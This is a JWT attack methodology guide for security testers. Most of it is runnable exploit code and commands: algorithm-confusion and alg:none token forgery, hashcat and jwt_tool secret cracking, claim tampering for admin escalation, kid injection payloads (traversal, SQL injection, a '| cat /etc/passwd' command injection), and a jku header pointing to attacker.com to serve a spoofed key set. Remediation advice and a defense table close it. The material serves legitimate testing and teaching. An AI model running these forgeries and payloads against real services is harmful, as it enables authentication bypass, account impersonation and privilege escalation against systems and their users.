# JWT Attack Methodology Guide

Comprehensive methodology for discovering and exploiting JWT (JSON Web Token) vulnerabilities, covering token structure, algorithm attacks, key brute force, claim manipulation, JWK abuse, and end-to-end exploitation workflows.

---

## 1. JWT Fundamentals for Security Testing

### 1.1 Token Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

| Part | Purpose | Example Content |
|------|---------|----------------|
| **Header** | Algorithm and token type | `{"alg":"HS256","typ":"JWT"}` |
| **Payload** | Claims (user data, permissions) | `{"sub":"1234","role":"user","exp":1700000000}` |
| **Signature** | Integrity verification | `HMACSHA256(base64url(header) + "." + base64url(payload), secret)` |

### 1.2 Common Signing Algorithms

| Algorithm | Type | Key | Usage |
|-----------|------|-----|-------|
| HS256 | Symmetric (HMAC) | Shared secret | Simple deployments, single-server |
| HS384 | Symmetric (HMAC) | Shared secret | Stronger HMAC variant |
| HS512 | Symmetric (HMAC) | Shared secret | Strongest HMAC variant |
| RS256 | Asymmetric (RSA) | Private/public key pair | Distributed systems, microservices |
| RS384 | Asymmetric (RSA) | Private/public key pair | Stronger RSA variant |
| RS512 | Asymmetric (RSA) | Private/public key pair | Strongest RSA variant |
| ES256 | Asymmetric (ECDSA) | Private/public key pair | Compact tokens, mobile |
| PS256 | Asymmetric (RSA-PSS) | Private/public key pair | Newer RSA variant |

### 1.3 Initial Token Analysis

```bash
# Decode a JWT without verification (inspect structure)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f1 | base64 -d 2>/dev/null; echo
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null; echo
# Output: {"sub":"1234567890","name":"John Doe","iat":1516239022}

# jwt_tool quick analysis
python3 jwt_tool.py <TOKEN>
# Displays: header, payload, signature, algorithm, timestamps, potential vulnerabilities
```

---

## 2. Algorithm Confusion Attacks

### 2.1 RS256 to HS256 Confusion

The most critical JWT vulnerability. When a server uses RS256 (asymmetric), the public key verifies signatures. If the server also accepts HS256 (symmetric), an attacker can sign tokens using the public key as the HMAC secret.

```bash
# Step 1: Obtain the public key
# Common locations:
curl -s https://target.com/.well-known/jwks.json | jq .
curl -s https://target.com/certs | jq .
curl -s https://target.com/api/keys | jq .
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# Step 2: jwt_tool automated algorithm confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
# Switches algorithm to HS256 and signs with the public key

# Step 3: Manual Python exploit
python3 -c "
import jwt

# Read public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Decode without verification
payload = jwt.decode('<TOKEN>', options={'verify_signature': False})

# Modify claims
payload['role'] = 'admin'
payload['sub'] = '1'

# Re-sign as HS256 using public key as HMAC secret
forged = jwt.encode(payload, public_key, algorithm='HS256')
print(forged)
"
```

### 2.2 None Algorithm Attack

Some JWT libraries accept `alg: none`, which means no signature is required.

```bash
# jwt_tool — none algorithm attack
python3 jwt_tool.py <TOKEN> -X a
# Generates tokens with: none, None, NONE, nOnE (case variations)

# Manual construction
python3 -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin','name':'attacker','iat':1516239022}).encode()).decode().rstrip('=')

# No signature — just trailing dot
token = f'{header}.{payload}.'
print(token)
"

# Test all case variations
for alg in none None NONE nOnE noNe NoNe; do
    python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'$alg','typ':'JWT'}).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).decode().rstrip('=')
print(f'{h}.{p}.')
"
done
```

### 2.3 Algorithm Stripping

Remove the signature entirely and test with an empty algorithm:

```bash
# Strip signature (keep only header.payload.)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
STRIPPED="${TOKEN%.*}."

curl -s -H "Authorization: Bearer $STRIPPED" https://target.com/api/protected
```

---

## 3. Key Brute Force

### 3.1 Hashcat (GPU-Accelerated)

For HS256/HS384/HS512 tokens, the HMAC secret can be brute forced if it is weak.

```bash
# Save the full JWT to a file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# Hashcat mode 16500 — JWT brute force
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules for common patterns
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (if you know the secret pattern)
# 8-character lowercase + digits
hashcat -m 16500 jwt.txt -a 3 '?l?l?l?l?l?d?d?d'

# Check results
hashcat -m 16500 jwt.txt --show
```

### 3.2 jwt_tool Key Brute Force

```bash
# Dictionary attack
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first
python3 -c "
secrets = [
    'secret', 'password', 'key', 'jwt_secret', 'token_secret',
    'my_secret', 'changeme', 'test', '123456', 'admin',
    'jwt', 'secret_key', 'api_key', 'private_key', 'signing_key',
    'supersecret', 'mysecret', 'default', 'development', 'production',
    'your-256-bit-secret', 'your-secret-key', 'shhh', 's3cr3t',
]
with open('jwt_secrets.txt', 'w') as f:
    f.write('\n'.join(secrets))
"
python3 jwt_tool.py <TOKEN> -C -d jwt_secrets.txt
```

### 3.3 jwt-cracker (Node.js)

```bash
# Installation
npm install -g jwt-cracker

# Brute force (character set + max length)
jwt-cracker <TOKEN> "abcdefghijklmnopqrstuvwxyz0123456789" 8
# Tries all combinations up to 8 characters

# Alphanumeric + common special characters
jwt-cracker <TOKEN> "abcdefghijklmnopqrstuvwxyz0123456789!@#$%&*" 6
```

### 3.4 After Recovering the Secret

```bash
# Once you have the secret, forge any token
python3 jwt_tool.py <TOKEN> -S hs256 -p "recovered_secret" -I \
    -pc role -pv admin \
    -pc sub -pv 1 \
    -pc name -pv "Admin User"

# Or with Python
python3 -c "
import jwt
token = jwt.encode(
    {'sub': '1', 'role': 'admin', 'name': 'Admin', 'iat': 1516239022, 'exp': 9999999999},
    'recovered_secret',
    algorithm='HS256'
)
print(token)
"
```

---

## 4. Token Manipulation

### 4.1 Expiration Bypass

```bash
# Decode and check expiration
python3 -c "
import jwt, datetime
token = '<TOKEN>'
payload = jwt.decode(token, options={'verify_signature': False})
exp = payload.get('exp')
if exp:
    print(f'Expires: {datetime.datetime.fromtimestamp(exp)}')
    print(f'Now:     {datetime.datetime.now()}')
    print(f'Expired: {datetime.datetime.now() > datetime.datetime.fromtimestamp(exp)}')
"

# Forge token with far-future expiration
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I \
    -pc exp -pv 9999999999

# Remove exp claim entirely
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I \
    -pd exp
```

### 4.2 Claim Manipulation

```bash
# jwt_tool interactive tampering mode
python3 jwt_tool.py <TOKEN> -T
# Presents each claim for editing

# Specific claim modifications
# Change role to admin
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I -pc role -pv admin

# Change user ID (horizontal privilege escalation)
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I -pc sub -pv 1

# Add new claims
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I \
    -pc is_admin -pv true \
    -pc permissions -pv '["read","write","delete","admin"]'

# Modify issuer (iss) to bypass validation
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I -pc iss -pv "https://trusted-issuer.com"
```

### 4.3 kid (Key ID) Injection

The `kid` header parameter tells the server which key to use for verification. If the server uses `kid` in an unsafe way (e.g., as a file path or database query), it can be exploited.

```bash
# Directory traversal via kid
python3 -c "
import jwt

# Sign with empty string (content of /dev/null)
token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    '',  # empty key
    algorithm='HS256',
    headers={'kid': '../../../../../../dev/null'}
)
print(token)
"

# SQL injection via kid
python3 -c "
import jwt

# kid value used in SQL query: SELECT key FROM keys WHERE id = '\$kid'
token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    'found_secret',
    algorithm='HS256',
    headers={'kid': \"' UNION SELECT 'found_secret' -- \"}
)
print(token)
"

# Command injection via kid (rare but devastating)
python3 -c "
import jwt

token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    '',
    algorithm='HS256',
    headers={'kid': '| cat /etc/passwd'}
)
print(token)
"

# jwt_tool kid injection
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "/proc/sys/kernel/hostname" -S hs256 -p "$(cat /proc/sys/kernel/hostname 2>/dev/null || echo '')"
```

### 4.4 Header Parameter Injection

Beyond `kid`, other header parameters can be exploited:

```bash
# jku (JWK Set URL) injection — point to attacker-controlled JWKS
python3 -c "
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Generate attacker key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

# Sign token with attacker's private key, point jku to attacker's server
token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    private_key,
    algorithm='RS256',
    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
)
print(token)

# Host the matching public key at attacker.com/.well-known/jwks.json
public_key = private_key.public_key()
print('Host matching JWKS at the jku URL')
"

# x5u (X.509 URL) injection — similar to jku but with certificates
# The server fetches the certificate from the attacker URL
```

---

## 5. JWK and JWKS Abuse

### 5.1 Embedded JWK Attack

Some libraries accept a JWK (JSON Web Key) embedded in the JWT header. The attacker generates a key pair, embeds the public key in the header, and signs with the private key.

```bash
# jwt_tool embedded JWK attack
python3 jwt_tool.py <TOKEN> -X i
# Generates a new RSA key pair, embeds the public key in the header,
# signs the token with the private key

# Manual Python exploit
python3 -c "
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json, base64

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build JWK
def int_to_base64url(n):
    data = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

jwk = {
    'kty': 'RSA',
    'n': int_to_base64url(public_numbers.n),
    'e': int_to_base64url(public_numbers.e)
}

# Encode token with embedded JWK
token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    private_key,
    algorithm='RS256',
    headers={'jwk': jwk}
)
print(token)
"
```

### 5.2 JWKS Endpoint Abuse

```bash
# Step 1: Find the JWKS endpoint
curl -s https://target.com/.well-known/jwks.json | jq .
curl -s https://target.com/.well-known/openid-configuration | jq '.jwks_uri'

# Step 2: Check for key confusion opportunities
# If the JWKS contains multiple keys, test each kid
curl -s https://target.com/.well-known/jwks.json | jq '.keys[] | .kid'

# Step 3: If JWKS endpoint is cached, inject via cache poisoning
# Or if jku header is accepted, host a spoofed JWKS

# Step 4: JWKS spoofing with jwt_tool
python3 jwt_tool.py <TOKEN> -X s
# Generates spoofed JWKS and token, outputs the JWKS to host
```

### 5.3 Recovering Private Keys from JWKS

```bash
# Check if JWKS accidentally includes private key material
curl -s https://target.com/.well-known/jwks.json | jq '.keys[] | has("d")'
# "d" parameter = private key exponent. If present, full key compromise.

# Check for weak RSA keys (small key size)
curl -s https://target.com/.well-known/jwks.json | jq '.keys[] | .n' | while read n; do
    # Decode and check bit length
    echo "$n" | python3 -c "
import sys, base64
n_b64 = sys.stdin.read().strip().strip('\"')
n_bytes = base64.urlsafe_b64decode(n_b64 + '==')
n_int = int.from_bytes(n_bytes, 'big')
print(f'Key size: {n_int.bit_length()} bits')
if n_int.bit_length() < 2048:
    print('WARNING: Weak key size!')
"
done
```

---

## 6. Tools Reference

### 6.1 jwt_tool (Primary Tool)

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt

# Core commands
python3 jwt_tool.py <TOKEN>                         # Analyze token
python3 jwt_tool.py <TOKEN> -T                      # Interactive tampering
python3 jwt_tool.py <TOKEN> -X a                    # alg:none attack
python3 jwt_tool.py <TOKEN> -X k -pk public.pem     # Algorithm confusion (RS256->HS256)
python3 jwt_tool.py <TOKEN> -X i                    # Embedded JWK attack
python3 jwt_tool.py <TOKEN> -X s                    # JWKS spoofing
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt      # Key brute force
python3 jwt_tool.py <TOKEN> -S hs256 -p "secret" -I -pc role -pv admin  # Forge with known key

# All exploits at once
python3 jwt_tool.py <TOKEN> -M at -t https://target.com/api/protected \
    -rh "Authorization: Bearer"
# Runs all known attacks and tests each forged token against the endpoint
```

### 6.2 Hashcat JWT Mode

```bash
# Mode 16500 — JWT
hashcat -m 16500 jwt.txt wordlist.txt                          # Dictionary
hashcat -m 16500 jwt.txt wordlist.txt -r rules/best64.rule     # With rules
hashcat -m 16500 jwt.txt -a 3 '?a?a?a?a?a?a?a?a'              # Brute force 8 chars
hashcat -m 16500 jwt.txt -a 3 'secret?d?d?d?d'                 # Known prefix + digits
hashcat -m 16500 jwt.txt --show                                # Show cracked
```

### 6.3 Python Libraries

```bash
# PyJWT — encoding and decoding
pip3 install PyJWT cryptography

# python-jose — JOSE implementation (JWS, JWE, JWK)
pip3 install python-jose[cryptography]
```

```python
# PyJWT usage for testing
import jwt

# Decode without verification (analysis)
payload = jwt.decode(token, options={"verify_signature": False})

# Encode with HS256
forged = jwt.encode({"sub": "1", "role": "admin"}, "secret", algorithm="HS256")

# Encode with RS256
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
private_key = rsa.generate_private_key(65537, 2048, default_backend())
forged = jwt.encode({"sub": "1", "role": "admin"}, private_key, algorithm="RS256")
```

```python
# python-jose usage for JWK operations
from jose import jwt, jwk
from jose.constants import ALGORITHMS

# Decode with JWKS
jwks = {"keys": [...]}  # From /.well-known/jwks.json
key = jwk.construct(jwks["keys"][0])
payload = jwt.decode(token, key, algorithms=[ALGORITHMS.RS256])
```

---

## 7. Step-by-Step Exploitation Methodology

### Phase 1: Token Acquisition and Analysis

```
Step 1.1: Obtain a valid JWT
  - Log in to the application and capture the token
  - Check Authorization header, cookies, URL parameters
  - Look for tokens in localStorage, sessionStorage

Step 1.2: Decode and analyze
  - Decode header: identify algorithm, kid, jku, x5u
  - Decode payload: identify claims (sub, role, exp, iss, aud)
  - Note the algorithm — this determines which attacks apply

Step 1.3: Obtain multiple tokens
  - Get tokens for different users/roles (user vs admin)
  - Get tokens at different times (compare for predictability)
  - Check if tokens change on re-login (session binding)
```

### Phase 2: Algorithm Attacks

```
Step 2.1: Test none algorithm (all tokens)
  - Use jwt_tool -X a
  - Send forged token to a protected endpoint
  - Test case variations: none, None, NONE, nOnE

Step 2.2: Test algorithm confusion (RS256 tokens only)
  - Obtain the public key (JWKS, certificate, .well-known)
  - Use jwt_tool -X k -pk public.pem
  - Send forged token to a protected endpoint

Step 2.3: Test algorithm downgrade
  - If RS256, try sending HS256 token signed with any key
  - If RS512, try RS256 (weaker variant)
```

### Phase 3: Key Recovery

```
Step 3.1: Brute force HS256 secret (if HMAC algorithm)
  - hashcat -m 16500 with rockyou.txt
  - jwt_tool -C -d with common secrets list
  - Try environment-specific secrets: app name, domain, defaults

Step 3.2: Check for exposed keys
  - Search source code, config files, environment variables
  - Check .git exposure, Docker images, CI/CD logs
  - Check JWKS for accidentally included private key (d parameter)

Step 3.3: If key recovered
  - Forge tokens with arbitrary claims
  - Test role escalation, user impersonation, expiration bypass
```

### Phase 4: Claim and Header Manipulation

```
Step 4.1: Modify user claims
  - Change sub (user ID) — horizontal privilege escalation
  - Change role/permissions — vertical privilege escalation
  - Remove exp — infinite token lifetime
  - Change iss/aud — trust boundary bypass

Step 4.2: Header parameter injection
  - kid traversal: ../../../../../../dev/null
  - kid SQL injection: ' UNION SELECT 'key' --
  - jku injection: https://attacker.com/jwks.json
  - Embedded JWK: jwt_tool -X i

Step 4.3: Test token reuse
  - Can expired tokens still be used? (missing exp check)
  - Can tokens be used after password change? (missing revocation)
  - Can tokens be used after logout? (missing blacklist)
```

### Phase 5: Advanced Attacks

```
Step 5.1: Token confusion across services
  - Use a token from Service A on Service B
  - If both share a signing key (common in microservices)
  - Exploit different permission models across services

Step 5.2: Race conditions
  - Token refresh race: use old token during refresh window
  - Concurrent requests with same token during revocation

Step 5.3: JWE (Encrypted JWT) attacks
  - Check if encryption algorithm is weak
  - Test algorithm substitution in JWE header
  - Check for encryption oracle vulnerabilities
```

### Phase 6: Reporting

```
Step 6.1: Document with severity
  - CRITICAL: none algorithm accepted, algorithm confusion, key in JWKS
  - HIGH: Weak HMAC secret cracked, kid injection, missing expiration check
  - MEDIUM: Token not revoked after logout/password change, long expiration
  - LOW: Sensitive data in payload (unencrypted), verbose error messages

Step 6.2: Include proof-of-concept
  - Exact forged token
  - curl command to demonstrate exploitation
  - Before/after response comparison

Step 6.3: Remediation recommendations
  - Enforce algorithm allowlist (never accept none)
  - Use strong keys (RS256 with 2048+ bit keys, HS256 with 256+ bit secrets)
  - Validate all claims: exp, iss, aud, nbf
  - Implement token revocation (blacklist or short expiration + refresh)
  - Never use kid in file paths or SQL queries without sanitization
  - Reject tokens with embedded JWK/jku unless explicitly expected
```

---

## Defense Reference

| Control | Implementation | Notes |
|---------|---------------|-------|
| Algorithm allowlist | `algorithms=['RS256']` in verify call | Never allow `none`, never allow algorithm switching |
| Strong signing keys | HS256: min 256-bit random secret; RS256: min 2048-bit key | Use `openssl rand -hex 32` for HMAC secrets |
| Claim validation | Verify `exp`, `iss`, `aud`, `nbf` on every request | Reject tokens missing required claims |
| Short expiration | Access tokens: 15-30 minutes; Refresh tokens: 7-30 days | Reduces window of exploitation |
| Token revocation | Maintain a blacklist of revoked token IDs (jti claim) | Check on logout, password change, permission change |
| kid sanitization | Validate kid against allowlist, never use in file/SQL operations | Prevents traversal and injection |
| Reject embedded keys | Ignore jwk, jku, x5u headers unless explicitly trusted | Prevents key injection attacks |
| JWKS security | Never include private key material (d, p, q, dp, dq, qi) | Audit JWKS endpoints regularly |

---

**Document version**: 1.0
**Created**: 2026-05-22
**Estimated study time**: 4-5 hours
**Prerequisites**: Familiarity with `skills/web-auth-bypass/SKILL.md` and `skills/web-auth-bypass/guides/auth-bypass-complete-guide.md`
